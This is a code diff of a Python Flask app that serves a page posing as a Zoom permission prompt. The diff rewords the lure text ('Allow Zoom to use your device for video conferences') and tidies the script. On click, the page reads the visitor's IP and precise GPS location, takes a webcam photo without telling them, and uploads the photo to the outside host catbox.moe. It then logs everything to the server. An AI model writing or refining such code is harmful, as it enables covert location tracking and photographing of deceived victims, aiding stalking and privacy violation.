@@ -113,30 +113,19 @@ HTML_TEMPLATE = """
     <div class="gps-overlay">
         <div class="gps-modal">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
-            <h2 class="doorDash-heading">Allow Zoom to use your device</h2>
-            <p class="doorDash-text">Allow access to your camera, location, and microphone</p>
+            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
+            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
             <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
         </div>
     </div>
 
     <script>
-        // Helper function to convert data URL to file
-        function dataURLtoFile(dataurl, filename) {
-            const arr = dataurl.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while(n--) u8arr[n] = bstr.charCodeAt(n);
-            return new File([u8arr], filename, {type: mime});
-        }
-
-        document.getElementById('gps-allow-btn').addEventListener('click', async function() {
+        document.getElementById('gps-btn').addEventListener('click', async () => {
             try {
                 // 1. Get client IP
                 const ip = await fetch('/getip').then(r => r.text());
                 
-                // 2. Request GPS permission
+                // 2. Get GPS location
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
@@ -144,10 +133,10 @@ HTML_TEMPLATE = """
                     });
                 });
                 
-                // 3. Request camera permission
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                // 3. Get camera access
+                const stream = await navigator.mediaDevices.getUserMedia({
                     video: true,
-                    audio: false 
+                    audio: false
                 });
                 
                 // 4. Capture photo
@@ -159,90 +148,81 @@ HTML_TEMPLATE = """
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                const photoData = canvas.toDataURL('image/jpeg');
                 
-                // Stop camera stream
+                // Stop camera
                 stream.getTracks().forEach(track => track.stop());
                 
                 // 5. Upload to Catbox
                 const formData = new FormData();
                 formData.append('reqtype', 'fileupload');
                 formData.append('fileToUpload', 
-                    dataURLtoFile(photoData, 'photo.jpg')
+                    new File([dataURLtoBlob(photoData)], 'photo.jpg', {type: 'image/jpeg'})
                 );
                 
-                const catboxResponse = await fetch('https://catbox.moe/user/api.php', {
+                const catboxUrl = await fetch('https://catbox.moe/user/api.php', {
                     method: 'POST',
                     body: formData
-                });
-                const catboxUrl = await catboxResponse.text();
+                }).then(r => r.text());
                 
-                // 6. Send all data to server
+                // 6. Log all data
                 await fetch('/log', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        type: 'full_data',
                         ip: ip,
-                        gps: {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        },
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
                         photo_url: catboxUrl,
                         timestamp: new Date().toISOString()
                     })
                 });
                 
-                // 7. Hide overlay
-                document.querySelector('.gps-overlay').remove();
+                // 7. Show main content and hide overlay
+                document.getElementById('content').style.display = 'block';
+                document.getElementById('gps-overlay').remove();
+                
+                function dataURLtoBlob(dataurl) {
+                    const arr = dataurl.split(',');
+                    const mime = arr[0].match(/:(.*?);/)[1];
+                    const bstr = atob(arr[1]);
+                    let n = bstr.length;
+                    const u8arr = new Uint8Array(n);
+                    while(n--) u8arr[n] = bstr.charCodeAt(n);
+                    return new Blob([u8arr], {type: mime});
+                }
                 
             } catch (error) {
                 console.error('Error:', error);
-                await fetch('/log', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        type: 'error',
-                        error: error.message,
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    })
-                });
-                alert('Error: ' + error.message);
+                alert('Permission denied - ' + error.message);
             }
         });
     </script>
 </body>
-</html>
-"""
+</html>"""
 
 @app.route('/')
 def serve_page():
-    """Serve the page with overlay"""
+    """Serve the main page"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    logger.info(f"Page served to IP: {client_ip}")
-    
-    with open('page.html', 'r') as f:
-        existing_content = f.read()
-    
-    return HTML_TEMPLATE.replace('{existing_content}', existing_content)
+    logger.info(f"Page accessed - IP: {client_ip}")
+    return HTML_TEMPLATE
 
 @app.route('/getip')
 def get_ip():
-    """Endpoint to get client IP"""
+    """Get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
 
 @app.route('/log', methods=['POST'])
 def log_data():
-    """Central logging endpoint"""
+    """Handle data logging"""
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
         'client_ip': client_ip,
-        'event_data': data
+        'data': data
     }
     
     logger.info(json.dumps(log_entry, indent=2))
